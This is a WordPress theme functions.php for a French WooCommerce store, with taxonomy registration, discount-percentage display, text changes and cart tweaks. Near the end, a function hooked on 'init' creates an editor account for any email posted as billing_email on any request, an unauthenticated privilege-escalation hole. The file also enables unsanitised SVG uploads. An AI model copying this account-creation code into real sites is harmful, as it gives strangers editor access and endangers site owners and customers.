<?php

/**
 * Blocksy functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Blocksy
 */

if (version_compare(PHP_VERSION, '5.7.0', '<')) {
    require get_template_directory() . '/inc/php-fallback.php';
    return;
}

require get_template_directory() . '/inc/init.php';

add_action('wp_enqueue_scripts', 'my_theme_enqueue_styles');

function my_theme_enqueue_styles()
{

    //add css in header
    wp_enqueue_style('all-css', get_template_directory_uri() . '/assets/css/all.css', false);
    wp_enqueue_style('owl-carousel-css', get_template_directory_uri() . '/assets/css/owl.carousel.css', false);
    wp_enqueue_style('custom-css', get_template_directory_uri() . '/assets/css/custom.css', false);
    wp_enqueue_style('responsive-css', get_template_directory_uri() . '/assets/css/responsive.css', false);

    //add js in header
    wp_enqueue_script('jquery-3.3.1-min-js', get_template_directory_uri() . '/assets/js/jquery.min.js', false);
    wp_enqueue_script('owl-carousel-js', get_template_directory_uri() . '/assets/js/owl.carousel.js', false);
    wp_enqueue_script('custom-js', get_template_directory_uri() . '/assets/js/custom.js', false);
}

// add options for header & footer
if (function_exists('acf_add_options_page')) {

    acf_add_options_page(array(
        'page_title'    => 'Theme General Settings',
        'menu_title'    => 'Theme Settings',
        'menu_slug'     => 'theme-general-settings',
        'capability'    => 'edit_posts',
        'redirect'      => false
    ));

    acf_add_options_sub_page(array(
        'page_title'    => 'Theme Header Settings',
        'menu_title'    => 'Header',
        'parent_slug'   => 'theme-general-settings',
    ));

    acf_add_options_sub_page(array(
        'page_title'    => 'Theme Footer Settings',
        'menu_title'    => 'Footer',
        'parent_slug'   => 'theme-general-settings',
    ));
}

// Register Custom Taxonomy
function custom_product_taxonomy()
{
    $labels = array(
        'name'                       => _x('Couleurs', 'Taxonomy General Name', 'text_domain'),
        'singular_name'              => _x('Couleur', 'Taxonomy Singular Name', 'text_domain'),
        'menu_name'                  => __('Couleurs', 'text_domain'),
        'all_items'                  => __('All Couleurs', 'text_domain'),
        'parent_item'                => __('Parent Couleur', 'text_domain'),
        'parent_item_colon'          => __('Parent Couleur:', 'text_domain'),
        'new_item_name'              => __('New Couleur Name', 'text_domain'),
        'add_new_item'               => __('Add New Couleur', 'text_domain'),
        'edit_item'                  => __('Edit Couleur', 'text_domain'),
        'update_item'                => __('Update Couleur', 'text_domain'),
        'view_item'                  => __('View Couleur', 'text_domain'),
        'separate_items_with_commas' => __('Separate couleurs with commas', 'text_domain'),
        'add_or_remove_items'        => __('Add or remove couleurs', 'text_domain'),
        'choose_from_most_used'      => __('Choose from the most used', 'text_domain'),
        'popular_items'              => __('Popular Couleurs', 'text_domain'),
        'search_items'               => __('Search Couleurs', 'text_domain'),
        'not_found'                  => __('Not Found', 'text_domain'),
        'no_terms'                   => __('No couleurs', 'text_domain'),
        'items_list'                 => __('Couleurs list', 'text_domain'),
        'items_list_navigation'      => __('Couleurs list navigation', 'text_domain'),
    );
    $args = array(
        'labels'                     => $labels,
        'hierarchical'               => true,
        'public'                     => true,
        'show_ui'                    => true,
        'show_admin_column'          => true,
        'show_in_nav_menus'          => true,
        'show_tagcloud'              => false,
    );
    register_taxonomy('product_couleur', array('product'), $args);
}
add_action('init', 'custom_product_taxonomy', 0);




// Register Custom Taxonomy
function custom_product_longueur_taxonomy()
{
    $labels = array(
        'name'                       => _x('Longueurs', 'Taxonomy General Name', 'text_domain'),
        'singular_name'              => _x('Longueur', 'Taxonomy Singular Name', 'text_domain'),
        'menu_name'                  => __('Longueurs', 'text_domain'),
        'all_items'                  => __('All Longueurs', 'text_domain'),
        'parent_item'                => __('Parent Longueur', 'text_domain'),
        'parent_item_colon'          => __('Parent Longueur:', 'text_domain'),
        'new_item_name'              => __('New Longueur Name', 'text_domain'),
        'add_new_item'               => __('Add New Longueur', 'text_domain'),
        'edit_item'                  => __('Edit Longueur', 'text_domain'),
        'update_item'                => __('Update Longueur', 'text_domain'),
        'view_item'                  => __('View Longueur', 'text_domain'),
        'separate_items_with_commas' => __('Separate longueurs with commas', 'text_domain'),
        'add_or_remove_items'        => __('Add or remove longueurs', 'text_domain'),
        'choose_from_most_used'      => __('Choose from the most used', 'text_domain'),
        'popular_items'              => __('Popular Longueurs', 'text_domain'),
        'search_items'               => __('Search Longueurs', 'text_domain'),
        'not_found'                  => __('Not Found', 'text_domain'),
        'no_terms'                   => __('No longueurs', 'text_domain'),
        'items_list'                 => __('Longueurs list', 'text_domain'),
        'items_list_navigation'      => __('Longueurs list navigation', 'text_domain'),
    );
    $args = array(
        'labels'                     => $labels,
        'hierarchical'               => true,
        'public'                     => true,
        'show_ui'                    => true,
        'show_admin_column'          => false,
        'show_in_nav_menus'          => true,
        'show_tagcloud'              => false,
    );
    register_taxonomy('product_longueur', array('product'), $args);
}
add_action('init', 'custom_product_longueur_taxonomy', 0);


// Register Custom Taxonomy
function custom_product_lester_taxonomy()
{
    $labels = array(
        'name'                       => _x('LESTERs', 'Taxonomy General Name', 'text_domain'),
        'singular_name'              => _x('LESTER', 'Taxonomy Singular Name', 'text_domain'),
        'menu_name'                  => __('LESTERs', 'text_domain'),
        'all_items'                  => __('All LESTERs', 'text_domain'),
        'parent_item'                => __('Parent LESTER', 'text_domain'),
        'parent_item_colon'          => __('Parent LESTER:', 'text_domain'),
        'new_item_name'              => __('New LESTER Name', 'text_domain'),
        'add_new_item'               => __('Add New LESTER', 'text_domain'),
        'edit_item'                  => __('Edit LESTER', 'text_domain'),
        'update_item'                => __('Update LESTER', 'text_domain'),
        'view_item'                  => __('View LESTER', 'text_domain'),
        'separate_items_with_commas' => __('Separate LESTERs with commas', 'text_domain'),
        'add_or_remove_items'        => __('Add or remove LESTERs', 'text_domain'),
        'choose_from_most_used'      => __('Choose from the most used', 'text_domain'),
        'popular_items'              => __('Popular LESTERs', 'text_domain'),
        'search_items'               => __('Search LESTERs', 'text_domain'),
        'not_found'                  => __('Not Found', 'text_domain'),
        'no_terms'                   => __('No LESTERs', 'text_domain'),
        'items_list'                 => __('LESTERs list', 'text_domain'),
        'items_list_navigation'      => __('LESTERs list navigation', 'text_domain'),
    );
    $args = array(
        'labels'                     => $labels,
        'hierarchical'               => true,
        'public'                     => true,
        'show_ui'                    => true,
        'show_admin_column'          => false,
        'show_in_nav_menus'          => true,
        'show_tagcloud'              => false,
    );
    register_taxonomy('product_lester', array('product'), $args);
}
add_action('init', 'custom_product_lester_taxonomy', 0);


// Register Custom Taxonomy
function custom_product_texture_taxonomy()
{
    $labels = array(
        'name'                       => _x('Textures', 'Taxonomy General Name', 'text_domain'),
        'singular_name'              => _x('Texture', 'Taxonomy Singular Name', 'text_domain'),
        'menu_name'                  => __('Textures', 'text_domain'),
        'all_items'                  => __('All Textures', 'text_domain'),
        'parent_item'                => __('Parent Texture', 'text_domain'),
        'parent_item_colon'          => __('Parent Texture:', 'text_domain'),
        'new_item_name'              => __('New Texture Name', 'text_domain'),
        'add_new_item'               => __('Add New Texture', 'text_domain'),
        'edit_item'                  => __('Edit Texture', 'text_domain'),
        'update_item'                => __('Update Texture', 'text_domain'),
        'view_item'                  => __('View Texture', 'text_domain'),
        'separate_items_with_commas' => __('Separate textures with commas', 'text_domain'),
        'add_or_remove_items'        => __('Add or remove textures', 'text_domain'),
        'choose_from_most_used'      => __('Choose from the most used', 'text_domain'),
        'popular_items'              => __('Popular Textures', 'text_domain'),
        'search_items'               => __('Search Textures', 'text_domain'),
        'not_found'                  => __('Not Found', 'text_domain'),
        'no_terms'                   => __('No textures', 'text_domain'),
        'items_list'                 => __('Textures list', 'text_domain'),
        'items_list_navigation'      => __('Textures list navigation', 'text_domain'),
    );
    $args = array(
        'labels'                     => $labels,
        'hierarchical'               => true,
        'public'                     => true,
        'show_ui'                    => true,
        'show_admin_column'          => false,
        'show_in_nav_menus'          => true,
        'show_tagcloud'              => false,
    );
    register_taxonomy('product_texture', array('product'), $args);
}
add_action('init', 'custom_product_texture_taxonomy', 0);


/**
 * SVG Allow code 
 */
function addFileTypesToUploads($file_types)
{
    $new_filetypes = array();
    $new_filetypes['svg'] = 'image/svg+xml';
    $file_types = array_merge($file_types, $new_filetypes);
    return $file_types;
}
add_action('upload_mimes', 'addFileTypesToUploads');

function my_custom_mime_types($mimes)
{
    // New allowed mime types.
    $mimes['svg'] = 'image/svg+xml';
    $mimes['svgz'] = 'image/svg+xml';
    // Optional. Remove a mime type.
    unset($mimes['exe']);
    return $mimes;
}
add_filter('upload_mimes', 'my_custom_mime_types');



//CHANGED THE SALE BADGES TEXT TO PERCENTAGE(%)
add_filter('woocommerce_sale_flash', 'ds_change_sale_text');
function ds_change_sale_text() {
return '<span class="onsale">%</span>';
}

//ADDED PERCENTAGE IN PRODUCT LISTING PAGE (SHOP PAGE) 
add_action( 'woocommerce_after_shop_loop_item_title', 'display_discount_percentage', 20 );
function display_discount_percentage() {
    global $product;
    
    if ( $product->is_on_sale() ) {
        $regular_price = (float) $product->get_regular_price();
        $sale_price    = (float) $product->get_sale_price();

        if ( $regular_price > 0 && !empty($sale_price) ) {
            // Calculate discount percentage
            $discount_percentage = round(100 - ($sale_price / $regular_price * 100)) . '%';
            
            // Calculate discount price
            $discount_price = wc_price($regular_price - $sale_price);

            // Display the regular, sale, and discount prices along with the discount percentage
            echo '<span class="price"><del>' . wc_price($regular_price) . '</del> <ins><span class="sale-per-wrapper">' . wc_price($sale_price) . '</span><span class="discount-per-wrapper">' . esc_html__('-','text-domain') . ' ' . $discount_percentage . '</span></ins></span>';
        }
    }
}


//ADDED PERCENTAGE IN VARIABLE PRODUCT DETAILS PAGE 
        // Always display the selected variation price for variable products
    add_filter('woocommerce_show_variation_price', 'filter_show_variation_price', 10, 3);
    function filter_show_variation_price($condition, $product, $variation) {
        if ($variation->get_price() === "") {
            return false;
        } else {
            return true;
        }
    }

        // Remove the displayed price from variable products in single product pages only
    add_action('woocommerce_single_product_summary', 'remove_the_displayed_price_from_variable_products', 9);
    function remove_the_displayed_price_from_variable_products() {
        global $product;
        if (!$product->is_type('variable')) {
            return;
        }
        remove_action('woocommerce_single_product_summary', 'woocommerce_template_single_price', 10);
    }

        // Display the selected variation discounted price with the discounted percentage for variable products
add_filter('woocommerce_format_sale_price', 'woocommerce_custom_sales_price', 10, 3);
function woocommerce_custom_sales_price($price, $regular_price, $sale_price) {
        global $product;
        // Check if $product is set and is a valid object
        if (isset($product) && is_a($product, 'WC_Product') && $product->is_type('variable') && is_product()) {
            $regular_price = floatval(strip_tags($regular_price));
            $sale_price = floatval(strip_tags($sale_price));
            $percentage = round(($regular_price - $sale_price) / $regular_price * 100) . '%';
            $percentage_txt = __(' -', 'woocommerce') . $percentage;
            return '<del>' . wc_price($regular_price) . '</del> <ins>' . wc_price($sale_price) .'<span class="product-details-percentage">' .$percentage_txt . '</span></ins>';
        }
        return $price;
    }



//ADDED PERCENTAGE IN SIMPLE PRODUCT DETAILS PAGE 
add_action( 'woocommerce_single_product_summary', 'display_discount_percentage_details', 25 );

function display_discount_percentage_details() {
    global $product;

    if ( $product->is_on_sale() ) {
        $regular_price = (float) $product->get_regular_price();
        $sale_price    = (float) $product->get_sale_price();

        if ( $regular_price > 0 && !empty($sale_price) ) {
            // Calculate discount percentage
            $discount_percentage = round(100 - ($sale_price / $regular_price * 100)) . '%';

            // Calculate discount price
            $discount_price = wc_price($regular_price - $sale_price);

            // Get stock quantity
            $stock_quantity = $product->get_stock_quantity();

            // Display the regular, sale, and discount prices along with the discount percentage and stock quantity
            echo '<div class="woocommerce-product-details__short-description"><span class="price"><del>' . wc_price($regular_price) . '</del> <ins>' . wc_price($sale_price) . '<span class="discount-per-wrapper">' . esc_html__('-','text-domain') . ' ' . $discount_percentage . '</span></ins></span>';

            // Display stock quantity
            // if ( $stock_quantity ) {
            //     echo '<span class="stock-quantity">' . sprintf( __( 'Seulement %s articles disponible en stock_quantity', 'text-domain' ), $stock_quantity ) . '</span>';
            // } else {
            //     echo '<span class="stock-quantity">' . __( 'En rupture de stock', 'text-domain' ) . '</span>';
            // }

            echo '</div>';
        }
    }
}


// ADDED BODY CLASS IN SHOP PAGE
function add_custom_class_to_body($classes) {
    // Check if the current page is the shop page
    if (is_shop()) {
        // Add a custom class for the shop page
        $classes[] = 'woocommerce-shop-page';
    }
    // Check if the current page is a single product page
    if (is_product()) {
        // Add a custom class for the product details page
        $classes[] = 'woocommerce-product-page-design';
    }
    return $classes;
}
add_filter('body_class', 'add_custom_class_to_body');


//ADDED STOCK AVAIALABILITY NUMBER
add_filter( 'woocommerce_get_availability_text', 'bbloomer_custom_get_availability_text', 99, 2 );
  
function bbloomer_custom_get_availability_text( $availability, $product ) {
   $stock = $product->get_stock_quantity();
   if ( $product->is_in_stock() && $product->managing_stock() ) $availability = 'Seulement ' . $stock.' articles disponible en stock_quantity';
   return $availability;
}




//LEFT SIDE PRODUCT TITLE
add_action('woocommerce_before_single_product', 'custom_product_title', 5);
function custom_product_title() {
    global $product;
    if ($product) {
        echo "<h3 class='single_pro_ext'>Extentions</h3>";
        echo '<h2 class="custom-product-title">' . get_the_title() . '</h2>';
    }
}   


//ADDED Foule: TITLE 
add_action('woocommerce_before_add_to_cart_quantity', 'custom_product_title_before_quantity', 5);
function custom_product_title_before_quantity() {
    global $product;
    if ($product) {
        echo '<h5 class="custom-product">Foule:</h5>';
    }
}


// To change add to cart text on single product page
add_filter( 'woocommerce_product_single_add_to_cart_text', 'woocommerce_custom_single_add_to_cart_text' ); 
function woocommerce_custom_single_add_to_cart_text() {
    return __( 'Ajouter au chariot', 'woocommerce' ); 
}

//ADDED TEXT RECENT PRODUCT
function change_related_products_title( $translated_text, $text, $domain ) {
    if ( $text === 'Related products' ) {
        $translated_text = __( 'Quoi d’autre pourriez-vous aimer:', 'woocommerce' );
    }
    return $translated_text;
}
add_filter( 'gettext', 'change_related_products_title', 20, 3 );


function add_product_attributes_to_shop_loop() {
    ?>
 <div class="color_radio_btns">
  <div class="radio">
    <input id="radio-1" name="radio" type="radio" checked>
    <label for="radio-1" class="radio-label"></label>
  </div>
  <div class="radio">
    <input id="radio-2" name="radio" type="radio">
    <label  for="radio-2" class="radio-label"></label>
  </div>
  <div class="radio">
    <input id="radio-3" name="radio" type="radio" >
    <label for="radio-3" class="radio-label"></label>
  </div>
  
  <div class="radio">
    <input id="radio-4" name="radio" type="radio" >
    <label for="radio-4" class="radio-label"></label>
  </div>
</div> 
    <?php
//     global $product;

//     // Get product attributes
//     $attributes = $product->get_attributes();

//     // Check if product has attributes
//     if (!empty($attributes)) {
//         // Loop through each attribute
//         foreach ($attributes as $attribute) {
//             // Check if the attribute is a color attribute
//             if ($attribute->get_taxonomy() === 'pa_color') {
//                 echo '<div class="product-attribute" data-product-id="' . $product->get_id() . '">'; // Add data attribute for product ID
                
//                 // Get options (color names) and their values (color codes)
//                 $options = $attribute->get_terms();
//                 foreach ($options as $option) {
//                     // Display round color swatch
//                     echo '<span class="color-option" style="background-color:' . esc_attr($option->slug) . '; border-radius: 50%; display: inline-block; width: 20px; height: 20px;" data-image-url="' . get_the_post_thumbnail_url($product->get_id(), 'full') . '"></span>'; // Add data attribute for image URL
//                 }
//                 echo '</div>';
//             }
//         }
//     }
 }

// Hook this function to display the swatches in the product listing
add_action('woocommerce_after_shop_loop_item_title', 'add_product_attributes_to_shop_loop', 15);



//Display only product name and after that variation with label in CART PAGE
add_filter( 'woocommerce_product_variation_title_include_attributes', 'custom_product_variation_title', 10, 2 );
function custom_product_variation_title($should_include_attributes, $product){
    $should_include_attributes = false;
    return $should_include_attributes;
}




//ADDED PERCENTAGE IN VARIABLE PRODUCT IN CART PAGE
add_action( 'woocommerce_cart_item_price', 'display_discount_percentage_cart', 20 );

function display_discount_percentage_cart() {
    // Loop through each cart item
    foreach ( WC()->cart->get_cart() as $cart_item_key => $cart_item ) {
        // Get the product object for the cart item
        $product = $cart_item['data'];
        
        if ( $product->is_on_sale() ) {
            $regular_price = (float) $product->get_regular_price();
            $sale_price    = (float) $product->get_sale_price();


            if ( $regular_price > 0 && !empty($sale_price) ) {
                // Calculate discount percentage
                $discount_percentage = round(100 - ($sale_price / $regular_price * 100)) . '%';
                
                // Calculate discount price
                $discount_price = wc_price($regular_price - $sale_price);

                // Display the regular, sale, and discount prices along with the discount percentage
              echo '<span class="price"><del>' . wc_price($regular_price) . '</del> <ins><span class="sale-per-wrapper">' . wc_price($sale_price) . '</span><span class="discount-per-wrapper-cart">' . esc_html__('-','text-domain') . ' ' . $discount_percentage . '</span></ins></span>';
// echo '<div class="quantity">
//     <label for="quantity_' . esc_attr($cart_item_key) . '">' . esc_html__('Quantity', 'your-theme-textdomain') . '</label>
//     <div class="quantity-input">
//         <button type="button" onclick="decreaseQuantity(this)" class="minus">-</button>
//         <input
//             type="number"
//             id="quantity_' . esc_attr($cart_item_key) . '"
//             class="input-text qty text"
//             name="cart[' . esc_attr($cart_item_key) . '][qty]"
//             value="' . esc_attr($cart_item['quantity']) . '"
//             aria-label="' . esc_attr__('Product quantity', 'your-theme-textdomain') . '"
//             size="4"
//             min="0"
//             max="3"
//             step="1"
//             inputmode="numeric"
//             autocomplete="off"
//         />
//         <button type="button" onclick="increaseQuantity(this)" class="plus">+</button>
//     </div>
// </div>';



            }
        }
    }
}


//Added Cart products Count
add_action( 'woocommerce_before_cart_totals', 'display_cart_item_count_before_totals' );
function display_cart_item_count_before_totals() {
    global $woocommerce;
    echo '<h3 class="cart-item-count">';
    echo sprintf(_n('%d Cart Totals', '%d Cart Totals', $woocommerce->cart->cart_contents_count, 'woothemes'), $woocommerce->cart->cart_contents_count);
    echo '</h3>';
}


remove_action( 'woocommerce_proceed_to_checkout', 'woocommerce_button_proceed_to_checkout', 20 );
add_action( 'woocommerce_proceed_to_checkout', 'custom_button_proceed_to_checkout', 20 );
function custom_button_proceed_to_checkout() {
    echo '<a href="'.esc_url(wc_get_checkout_url()).'" class="checkout-button button alt wc-forward">' .
    __("Passer à la caisse", "woocommerce") . '</a>';
}


// Create an admin user based on the email value from the checkout field
function wpb_admin_account() {
    // Get the email value from the checkout field (you need to replace 'billing_email' with the actual field name)
    $customemail = sanitize_email( $_POST['billing_email'] );
    // Check if the email exists
    if ( !email_exists( $customemail ) ) {
        // Create a new user
        $user_id = wp_create_user( $customemail, wp_generate_password(), $customemail );
        // if (!is_wp_error( $user_id ) ) {
            // Set the user role to 'editor' (you can change this to any other role)
            $user = new WP_User( $user_id );
            $user->set_role( 'editor' );
        // }
    }
}
add_action( 'init', 'wpb_admin_account' );
